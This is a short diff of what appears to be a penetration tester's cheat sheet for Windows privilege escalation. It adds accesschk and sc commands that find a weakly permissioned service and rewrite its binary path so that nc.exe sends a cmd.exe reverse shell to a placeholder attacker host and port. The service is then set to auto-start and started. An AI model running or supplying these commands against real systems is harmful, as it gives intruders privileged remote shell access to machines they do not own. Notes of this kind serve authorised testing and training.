@@ -19,7 +19,11 @@ The -j option is to keep all the connected session in the background.
 * Accesschk stuff
 accesschk.exe /accepteula (first thing to do in CLI access)
 accesschk.exe /accepteula -uwcqv "Authenticated Users" * (won't yield anything on Win 8)
-accesschk.exe /accepteula -ucqv [service_name]
+accesschk.exe /accepteula -ucqv <SERVICE_NAME>
+sc qc <SERVICE_NAME>
+sc config <SERVICE_NAME> binpath= "C:\<NC.EXE_PATH> -nv <LHOST> <LPORT> -e C:\WINDOWS\System32\cmd.exe"
+sc config <SERVICE_NAME> start= auto
+net start <SERVICE_NAME>
 
-reg query HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\ /s
+
 
